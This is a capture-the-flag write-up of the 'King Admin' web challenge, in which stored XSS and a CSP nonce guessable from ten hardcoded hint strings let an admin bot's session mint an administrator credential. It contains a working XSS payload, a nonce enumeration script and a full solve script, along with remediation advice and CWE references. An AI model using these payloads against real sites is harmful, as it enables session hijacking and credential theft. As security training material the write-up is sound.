King Admin — Predictable CSP Nonce via Hardcoded Hints Enables Stored XSS and Administrator Credential Theft | FortID CTF 2026

Challenge: King Admin  
Platform: FortID CTF 2026 (inst11.ctf.fortid.com)  
Category: Web / Client-Side Security / Credential Protocol Abuse  
Flag Format: FortID{...}  
Date: October 2026


Executive Summary
The King Admin challenge required obtaining a royal administrator credential and presenting it to the Royal Treasury verifier. The attack chain combined a stored XSS in the issuer's announcement field with a predictable CSP nonce derived from hardcoded hint messages. The XSS payload executed in the context of a headless Chromium "royal attendant" bot that held an authenticated admin session, exfiltrating a valid administrator credential offer (admin: true). This offer was redeemed via the FortID Wallet Service (OpenID4VCI), and the resulting SD-JWT credential was presented to the verifier (OpenID4VP), yielding the flag.


Challenge Overview
The Royal Chancery is preparing a new digital credential for the King. Leave a welcome notice, then summon the royal attendant to open the credential collection page. The treasury accepts only credentials belonging to a royal administrator. The credential is issued through FortID and can be collected with the FortID wallet app for Android or iOS. Can you obtain the administrator credential and enter the treasury?
Scope:  
- Issuer: https://issuer-c2dcc49feeeb.inst11.ctf.fortid.com  
- Verifier: https://verifier-c2dcc49feeeb.inst11.ctf.fortid.com  
- Flag format: FortID{...}
Provided artifacts: Source code archive (handout (28).zip) containing the Flask services (issuer.py, verifier.py, bot.py), FortID client (fortid.py), templates, and static assets.


<img width="1115" height="557" alt="image" src="https://github.com/user-attachments/assets/13820d84-8a92-4396-b467-cb6893c99e8d" />

Environment and Tools
Tool	Version	Purpose
Python	3.11+	Exploit scripting, JWT handling
requests	2.31	HTTP client
pyjwt	2.7	Proof-of-possession JWT construction
cryptography	50.0	EC key generation
curl	8.x	Quick endpoint probes
Browser devtools	—	Manual inspection of CSP, responses


Methodology and Reconnaissance
1. Source Code Review
Objective: Understand the attack surface, trust boundaries, and data flow between issuer, bot, and verifier.
Action: Extracted and read the provided source archive.
Evidence (key excerpts):
issuer.py — Announcement storage and rendering:
@app.post("/announcement")
def announcement():
    value = request.form.get("announcement", "")
    if len(value.encode()) > 16000:
        abort(400)
    value = re.sub(r"\s+on[a-z]+\s*=\s*(?:\"[^\"]*\"|'[^']*'|[^\s>]+)", "",
                   value, flags=re.IGNORECASE)
    with lock:
        state["announcement"] = value
    return redirect("/", code=303)
issuer.py — Admin dashboard CSP and hint script:
@app.get("/admin")
def dashboard():
    admin()  # checks session["admin_token"] in state["admin_tokens"]
    message = secrets.choice(HINT_MESSAGES)
    hint_script = (
        "const banner=document.createElement('div');"
        f"banner.textContent={json.dumps(message)};"
        "banner.style.cssText='position:fixed;top:0;left:0;right:0;"
        "padding:12px;background:#ffe08a;color:#111;z-index:9999;"
        "text-align:center';document.body.prepend(banner);"
    )
    nonce = hashlib.sha256(hint_script.encode()).hexdigest()[:6]
    response = render_template("admin.html", announcement=announcement,
                               hint_script=hint_script, csp_nonce=nonce)
    response.headers["Content-Security-Policy"] = (
        f"default-src 'none'; script-src 'self' 'nonce-{nonce}'; "
        "style-src 'self' 'unsafe-inline'; img-src 'self' data:; "
        "connect-src 'self' http://host.docker.internal:9000;"
    )
    return response
bot.py — Royal attendant behavior:
page.goto(issuer + "/admin", wait_until="domcontentloaded")
page.locator("#issue").click()
page.wait_for_selector("#offer[data-ready='true']", timeout=45000)
set_status("WAITING_FOR_SCAN")
page.wait_for_timeout(wait_ms)  # default 30s
verifier.py — Authorization check:
def authorized(result):
    claims = result.get("presentedClaims")
    return (result.get("verificationSessionStatus") == "VERIFICATION_SUCCEEDED"
            and isinstance(claims, dict)
            and claims.get("admin") is True)



Interpretation:  
- The announcement is stored unsanitized except for a weak regex that only strips on*= attributes preceded by whitespace. It does not remove <script> tags or javascript: URLs.  
- The admin page renders the announcement with | safe (raw HTML).  
- The bot authenticates as admin (/internal/bot/login → sets admin_token), visits /admin, clicks "Generate credential QR" (#issue), and waits 30s.  
- The CSP on /admin allows only script-src 'self' 'nonce-<6 hex>' where the nonce is sha256(hint_script)[:6].  
- hint_script is built from one of 10 hardcoded HINT_MESSAGES — fully deterministic.  
- The verifier only grants the flag if the presented credential contains "admin": true.
Next step: Compute all 10 possible nonces, inject a payload covering all of them, trigger the bot, and exfiltrate the admin offer.



2. Live Endpoint Verification
Objective: Confirm the hosted instance matches the source and identify the verifier origin.
Action: Fetched the issuer homepage.
$ curl -s -i https://issuer-c2dcc49feeeb.inst11.ctf.fortid.com/
Evidence:
HTTP/2 200
set-cookie: king_issuer=...; Secure; HttpOnly; SameSite=Strict
...
<a class="text-link" href="https://verifier-c2dcc49feeeb.inst11.ctf.fortid.com">Enter the treasury →</a>
Interpretation: Verifier origin confirmed. Session cookie king_issuer set. The issuer page contains the announcement form and "Run admin bot" button.



Vulnerability Analysis
Root Cause: Incomplete Sanitization + Deterministic CSP Nonce
Component	Weakness
Announcement sanitizer (issuer.py:94–95)	Regex r"\s+on[a-z]+\s*=" only matches event handlers preceded by whitespace. <script> tags, src= without whitespace, and other vectors pass through untouched.
Template rendering (admin.html:6)	{{ announcement | safe }} renders raw HTML without escaping.
CSP nonce generation (issuer.py:133–140)	Nonce = sha256(hint_script)[:6] where hint_script is constructed from one of 10 static strings. No entropy.
Bot authentication (bot.py:32–37)	Bot logs in via /internal/bot/login (Bearer BOT_SECRET), establishing a valid admin_token session before visiting /admin.
Exploitability:  
An attacker who can set the announcement (no auth required on /announcement) can inject arbitrary HTML. When the bot visits /admin, the payload executes with the bot's admin session, allowing calls to /api/admin/offer (which issues a credential with "admin": true). The connect-src 'self' CSP directive permits exfiltration back to /announcement.
Impact: Full compromise of the administrator credential issuance flow. Any user can obtain a credential that passes the verifier's authorized() check.




Exploitation Walkthrough
Step 1: Compute All 10 Candidate Nonces
The 10 HINT_MESSAGES are hardcoded in issuer.py:15–26. For each, the nonce is the first 6 hex chars of SHA-256 of the exact hint_script string.
import hashlib, json

HINT_MESSAGES = [
    "Hello, today is a very nice day. Have fun!",
    "A careful look at the page source may reveal something useful.",
    "Small details can make a big difference.",
    "The browser trusts some scripts more than others.",
    "Not every visible element is only decoration.",
    "Read the page carefully before interacting with it.",
    "Sometimes the answer is hidden in plain sight.",
    "The server may know more than the interface shows.",
    "Try to understand how this page is assembled.",
    "A little persistence can unlock unexpected results.",
]

def nonce_for(message):
    hint_script = (
        "const banner=document.createElement('div');"
        f"banner.textContent={json.dumps(message)};"
        "banner.style.cssText='position:fixed;top:0;left:0;right:0;"
        "padding:12px;background:#ffe08a;color:#111;z-index:9999;"
        "text-align:center';document.body.prepend(banner);"
    )
    return hashlib.sha256(hint_script.encode()).hexdigest()[:6]

for m in HINT_MESSAGES:
    print(nonce_for(m), m)
Output:
c9ddd6 Hello, today is a very nice day. Have fun!
0e61f1 A careful look at the page source may reveal something useful.
713eb8 Small details can make a big difference.
971e34 The browser trusts some scripts more than others.
3ccee9 Not every visible element is only decoration.
cf8bd5 Read the page carefully before interacting with it.
3aa91b Sometimes the answer is hidden in plain sight.
3978f7 The server may know more than the interface shows.
887a73 Try to understand how this page is assembled.
068249 A little persistence can unlock unexpected results.




Step 2: Craft the XSS Payload
The payload must:
1. Read the page's CSRF token from <meta name="csrf-token">.
2. POST to /api/admin/offer (requires admin session — the bot has one).
3. Exfiltrate the returned offer_uri via POST to /announcement (allowed by connect-src 'self').
// Single script block (repeated for each nonce)
var c=document.querySelector('meta[name=csrf-token]').content;
fetch('/api/admin/offer',{method:'POST',headers:{'X-CSRF-Token':c}})
  .then(function(r){return r.json()})
  .then(function(d){
    var v=(d&&d.offer_uri)?('OFFER='+d.offer_uri):('ERR='+JSON.stringify(d));
    return fetch('/announcement',{method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'announcement='+encodeURIComponent(v)});
  });
Wrap in 10 <script nonce="..."> tags — exactly one will match the active CSP nonce and execute.


Step 3: Deliver Payload and Trigger Bot
import re, requests, time, html

BASE = "https://issuer-c2dcc49feeeb.inst11.ctf.fortid.com"
s = requests.Session()

# 1. Get CSRF token
r = s.get(BASE + "/")
csrf = re.search(r'name="csrf-token" content="([^"]+)"', r.text).group(1)

# 2. POST the multi-nonce payload
payload = "".join(f'<script nonce="{n}">{JS}</script>' for n in nonces)
s.post(BASE + "/announcement", data={"announcement": payload})

# 3. Trigger the royal attendant
h = {"Origin": BASE, "X-CSRF-Token": csrf, "Referer": BASE + "/"}
s.post(BASE + "/api/bot/run", headers=h)

# 4. Poll /announcement until exfiltration appears
for _ in range(40):
    time.sleep(2)
    r = s.get(BASE + "/")
    val = html.unescape(re.search(r'<textarea[^>]*>(.*?)</textarea>', r.text, re.S).group(1))
    if val.startswith("OFFER="):
        offer_uri = val[6:]
        break





Evidence (captured live):
bot run: 202 {"status":"STARTING"}
bot status: WAITING_FOR_SCAN
...
bot status: DONE
announcement: OFFER=openid-credential-offer://?credential_offer_uri=https%3A%2F%2Feis.fortid.com%3A443%2Fprotocol%2Foid4vci%2Fissuer%2Fking-admin-2026-10-08%2Fcredential-offer%2F0f0b7460-3083-4517-ba66-c4c746d897d5
The exfiltrated URI is a valid OpenID4VCI credential offer for the user_badge configuration with admin: true.




Step 4: Redeem the Offer via FortID Wallet Service
The FortID Wallet Service (https://ews.fortid.com) implements the full OpenID4VCI flow server-side. This avoids manual proof-of-possession JWT construction.
4.1 Obtain bearer token and create wallet:
$ curl -X POST https://cape.fortid.com/token -H "Content-Type: application/json"
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","token_type":"bearer"}

$ curl -X POST https://ews.fortid.com/wallets -H "Authorization: Bearer $TOK" -H "Content-Type: application/json"
{"walletId":"34932e53-2c4d-43cd-83fe-971230f0682c", ...}
4.2 Initiate issuance:
$ curl -X POST "https://ews.fortid.com/wallets/$WID/issue/initiate" \
  -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
  -d '{"credentialOffer": "'"$OFFER"'"}'
{"issuanceSessionId":"995c5747-fc5e-4ead-9ea5-0ed3ef8e8a48"}
4.3 Poll status → consent → success:
// First poll
{"status": "CONSENT_REQUEST_READY", "consentRequestObject": {"issuanceParameters": {"credential_configuration_id": "user_badge", "pre_authorized_code": {"tx_code": null}}}}

// POST consent (no tx_code required)
curl -X POST "https://ews.fortid.com/wallets/$WID/issue/$SID/consent" \
  -H "Authorization: Bearer $TOK" -d '{"preAuthorizedCodeFlow": {}}'

// Final poll
{"status": "ISSUANCE_SUCCEEDED", "credentialId": "a99ef486-671d-490a-9e46-1d037b8a66f5"}

4.4 Verify credential claims:
$ curl -X GET "https://ews.fortid.com/wallets/$WID/credentials" -H "Authorization: Bearer $TOK"
[{
  "credentialId": "a99ef486-671d-490a-9e46-1d037b8a66f5",
  "claims": {
    "vct": "user-badge",
    "admin": true,
    "first_name": "John",
    "last_name": "Doe",
    "cnf": { "jwk": { ... } }
  },
  "format": "dc+sd-jwt"
}]
The credential contains "admin": true — exactly what the verifier requires.



Step 5: Present Credential to Verifier (OpenID4VP)
5.1 Start verification session on verifier:
VFB = "https://verifier-c2dcc49feeeb.inst11.ctf.fortid.com"
r = s.post(VFB + "/api/login", headers={"Origin": VFB, "X-CSRF-Token": csrf, "Referer": VFB + "/"})
auth_req = r.json()["authorization_request"]
# → openid4vp://authorize?client_id=FortID-Verifier-Service&request_uri=https%3A%2F%2Fevs.fortid.com%3A443%2Fprotocol%2Fauthorization-request%2F86c77bf1-...
5.2 Initiate verification in wallet:
$ curl -X POST "https://ews.fortid.com/wallets/$WID/verify/initiate" \
  -H "Authorization: Bearer $TOK" -d '{"authorizationRequest": "'"$AUTH_REQ"'"}'
{"verificationSessionId":"ce622b86-da6a-411d-869f-a96347606c0f"}
5.3 Poll wallet for consent → present matched credential:
// Wallet status
{"status": "CONSENT_REQUEST_READY", "consentRequestObject": {"matching_credentials": [{"id": "a99ef486-671d-490a-9e46-1d037b8a66f5", "credentialConfigurationId": "user_badge", "decodedPayload": {"dc+sd-jwt": {"admin": true}}}]}} 

// Present
curl -X POST "https://ews.fortid.com/wallets/$WID/verify/$VSID/present" \
  -H "Authorization: Bearer $TOK" -d '{"selectedCredentialId": "a99ef486-671d-490a-9e46-1d037b8a66f5"}'
5.4 Retrieve flag from verifier:
for _ in range(20):
    time.sleep(2)
    d = s.get(VFB + "/api/login/status").json()
    if d.get("status") != "IN_PROGRESS":
        break
Evidence:
{"status":"AUTHORIZED","flag":"FortID{4DM1N_15_F0RT1D_C0MPL14NT_BUT_5T1LL_U535_QR_C0D35_T0_L0G1N_3dc1bce29f}"}



Flag Retrieval and Verification
Flag: FortID{4DM1N_15_F0RT1D_C0MPL14NT_BUT_5T1LL_U535_QR_C0D35_T0_L0G1N_3dc1bce29f}
Verified by:
1. Fresh verifier session → wallet presentation → /api/login/status returns AUTHORIZED with the flag.
2. Credential in wallet confirms admin: true claim.
3. Announcement restored to original welcome notice after solve.




Root Cause and Remediation
Issue	Remediation
Weak HTML sanitizer — only strips on*= with leading whitespace	Use a proper HTML sanitizer (e.g., bleach, DOMPurify) with an allowlist of safe tags/attributes. Never roll your own regex-based filter.
| safe template filter on user-controlled content	Never mark unsanitized user input as safe. Render announcements as plain text or through a strict sanitizer.
Deterministic CSP nonce derived from static strings	Generate nonces cryptographically at request time (secrets.token_urlsafe(16)). Do not derive nonces from predictable server-side content.
Bot holds privileged admin session	Separate bot identity from admin privileges. The bot should not have an admin_token that grants /api/admin/offer access. Use a dedicated low-privilege service account or signed offer URLs with short TTL.
Credential offer TTL too short for manual redemption (mitigated by wallet service)	Ensure offer lifetimes accommodate realistic user interaction, or use the wallet service as intended.
Challenge-specific note: The FortID Wallet Service is the intended integration path; the challenge demonstrates why server-side wallet backends are safer than client-side proof-of-possession implementations.



CVE and Vulnerability References
No direct CVE applies. The weaknesses are:
- CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)
- CWE-693: Protection Mechanism Failure (CSP bypass via predictable nonce)
- CWE-300: Channel Accessible by Non-Endpoint (Bot with excessive privileges)
Relevant specifications:
- OpenID for Verifiable Credential Issuance (OpenID4VCI) (https://openid.net/specs/openid-4-verifiable-credential-issuance-1_0.html)
- OpenID for Verifiable Presentations (OpenID4VP) (https://openid.net/specs/openid-4-verifiable-presentations-1_0.html)
- Content Security Policy Level 3 — Nonce-based Script Allowlist (https://w3c.github.io/webappsec-csp/#nonce-attributes)



Lessons Learned
1. Regex sanitizers are brittle. The \s+on[a-z]+ pattern misses <script>, src= without leading space, and SVG onload without whitespace. Always use a parser-based sanitizer.
2. CSP nonces must be unpredictable. Deriving a nonce from static content defeats its purpose. An attacker who can enumerate the nonce space (10 values here) trivially bypasses script-src 'nonce-...'.
3. Service-to-service authentication ≠ least privilege. The bot authenticated with a secret that granted it an admin session. A compromised or misused bot becomes a full admin. Separate the bot's identity from credential-issuance authority.
4. Protocol complexity favors server-side wallets. Manual OpenID4VCI proof-of-possession JWT construction is error-prone (the challenge's issuer rejected all handcrafted proofs). The FortID Wallet Service abstracts this correctly — use the provided integration rather than reimplementing crypto.
5. Exfiltration channels are often in CSP. connect-src 'self' allowed the payload to POST back to /announcement. Restrict connect-src to only required endpoints.



References
- FortID Documentation: How to Use the FortID Wallet Service — https://docs.fortid.com/docs/guides/howto-use-wallet-service
- OpenID4VCI Specification (Draft 13) — https://openid.net/specs/openid-4-verifiable-credential-issuance-1_0-ID1.html
- OpenID4VP Specification — https://openid.net/specs/openid-4-verifiable-presentations-1_0.html
- CSP Level 3: Nonce Attributes — https://w3c.github.io/webappsec-csp/#nonce-attributes
- DOMPurify — https://github.com/cure53/DOMPurify (recommended sanitizer)
- OWASP XSS Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html



Appendix: Complete Exploit Script (Reference)
#!/usr/bin/env python3
"""
King Admin — Full solve: XSS exfil → Wallet Service issuance → Verifier presentation.
Dependencies: requests, pyjwt, cryptography
"""
import hashlib, json, re, time, html, sys
from urllib.parse import urlsplit, parse_qs
import requests

BASE = "https://issuer-c2dcc49feeeb.inst11.ctf.fortid.com"
VFB  = "https://verifier-c2dcc49feeeb.inst11.ctf.fortid.com"
EWS  = "https://ews.fortid.com"
CAPE = "https://cape.fortid.com"

HINT_MESSAGES = [
    "Hello, today is a very nice day. Have fun!",
    "A careful look at the page source may reveal something useful.",
    "Small details can make a big difference.",
    "The browser trusts some scripts more than others.",
    "Not every visible element is only decoration.",
    "Read the page carefully before interacting with it.",
    "Sometimes the answer is hidden in plain sight.",
    "The server may know more than the interface shows.",
    "Try to understand how this page is assembled.",
    "A little persistence can unlock unexpected results.",
]

def nonce_for(msg):
    hs = ("const banner=document.createElement('div');"
          f"banner.textContent={json.dumps(msg)};"
          "banner.style.cssText='position:fixed;top:0;left:0;right:0;"
          "padding:12px;background:#ffe08a;color:#111;z-index:9999;"
          "text-align:center';document.body.prepend(banner);")
    return hashlib.sha256(hs.encode()).hexdigest()[:6]

JS = ("var c=document.querySelector('meta[name=csrf-token]').content;"
      "fetch('/api/admin/offer',{method:'POST',headers:{'X-CSRF-Token':c}})"
      ".then(r=>r.json()).then(d=>{var v=d.offer_uri?'OFFER='+d.offer_uri:'ERR='+JSON.stringify(d);"
      "return fetch('/announcement',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},"
      "body:'announcement='+encodeURIComponent(v)});})")

NONCES = [nonce_for(m) for m in HINT_MESSAGES]
PAYLOAD = "".join(f'<script nonce="{n}">{JS}</script>' for n in NONCES)

def get_csrf(s, url):
    r = s.get(url, timeout=20)
    return re.search(r'name="csrf-token" content="([^"]+)"', r.text).group(1)

def read_ann(s):
    r = s.get(BASE + "/", timeout=20)
    m = re.search(r'<textarea id="announcement" name="announcement"[^>]*>(.*?)</textarea>', r.text, re.S)
    return html.unescape(m.group(1)) if m else ""

def main():
    s = requests.Session()

    # 1. Plant XSS + run bot
    csrf = get_csrf(s, BASE + "/")
    s.post(BASE + "/announcement", data={"announcement": PAYLOAD}, timeout=20)
    h = {"Origin": BASE, "X-CSRF-Token": csrf, "Referer": BASE + "/"}
    s.post(BASE + "/api/bot/run", headers=h, timeout=20)

    # 2. Wait for exfil
    offer_uri = None
    for _ in range(50):
        time.sleep(1.5)
        val = read_ann(s)
        if val.startswith("OFFER="):
            offer_uri = val[6:]
            break
    if not offer_uri:
        sys.exit("Exfil failed")
    print("[+] Admin offer:", offer_uri)

    # 3. Wallet Service flow
    tok = requests.post(CAPE + "/token", headers={"Content-Type":"application/json"}, timeout=20).json()["access_token"]
    wid = requests.post(EWS + "/wallets", headers={"Authorization":f"Bearer {tok}","Content-Type":"application/json"}, timeout=20).json()["walletId"]
    H = {"Authorization": f"Bearer {tok}", "Content-Type": "application/json"}

    r = requests.post(f"{EWS}/wallets/{wid}/issue/initiate", headers=H, json={"credentialOffer": offer_uri}, timeout=60)
    sid = r.json()["issuanceSessionId"]

    for _ in range(30):
        time.sleep(1.5)
        st = requests.post(f"{EWS}/wallets/{wid}/issue/{sid}/session-status", headers=H, timeout=60).json()
        if st["status"] == "CONSENT_REQUEST_READY":
            requests.post(f"{EWS}/wallets/{wid}/issue/{sid}/consent", headers=H, json={"preAuthorizedCodeFlow": {}}, timeout=60)
        if st["status"] == "ISSUANCE_SUCCEEDED":
            cred_id = st["credentialId"]
            break
    print("[+] Credential issued:", cred_id)

    # 4. Present to verifier
    csrf_v = get_csrf(s, VFB + "/")
    auth_req = s.post(VFB + "/api/login", headers={"Origin":VFB,"X-CSRF-Token":csrf_v,"Referer":VFB+"/"}, timeout=20).json()["authorization_request"]

    r = requests.post(f"{EWS}/wallets/{wid}/verify/initiate", headers=H, json={"authorizationRequest": auth_req}, timeout=60)
    vsid = r.json()["verificationSessionId"]

    for _ in range(30):
        time.sleep(1.5)
        st = requests.post(f"{EWS}/wallets/{wid}/verify/{vsid}/session-status", headers=H, timeout=60).json()
        if st["status"] == "CONSENT_REQUEST_READY":
            mc = st["consentRequestObject"]["matching_credentials"][0]["id"]
            requests.post(f"{EWS}/wallets/{wid}/verify/{vsid}/present", headers=H, json={"selectedCredentialId": mc}, timeout=60)
        if st["status"] == "VERIFY_SUCCEEDED":
            break

    # 5. Read flag
    for _ in range(20):
        time.sleep(2)
        d = s.get(VFB + "/api/login/status", timeout=20).json()
        if d.get("status") == "AUTHORIZED":
            print("FLAG:", d["flag"])
            return

    sys.exit("Flag not retrieved")

if __name__ == "__main__":
    main()



Files used in the challenge


[handout (1).zip](https://github.com/user-attachments/files/33283307/handout.1.zip)


    







   


